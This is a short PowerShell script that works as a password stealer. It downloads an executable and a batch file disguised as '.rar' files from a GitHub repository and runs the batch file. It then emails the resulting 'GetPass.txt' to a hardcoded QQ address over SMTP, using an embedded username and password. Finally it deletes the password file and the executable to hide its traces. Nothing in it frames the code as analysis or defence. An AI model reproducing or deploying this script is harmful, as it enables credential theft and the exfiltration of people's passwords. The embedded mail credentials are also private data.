(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/KillTimeSummer/clopro/master/GetPass.rar','D:\Get.exe');

(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/KillTimeSummer/clopro/master/Command.rar','D:\Command.bat');

D:\Command.bat;
$SMTPServer = 'smtp.qq.com'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)

$SMTPInfo.EnableSsl = $true 

$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('2736984735@qq.com', 'u223110');

$ReportEmail = New-Object System.Net.Mail.MailMessage

$ReportEmail.From = '2736984735@qq.com'

$ReportEmail.To.Add('2736984735@qq.com')

$ReportEmail.Subject = 'GetPass'

$ReportEmail.Body = 'GetPass_text'  

$ReportEmail.Attachments.Add('D:\GetPass.txt')
$SMTPInfo.Timeout = 1000000
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Attachments.Dispose()

remove-item 'D:\GetPass.txt'

remove-item 'D:\Get.exe'
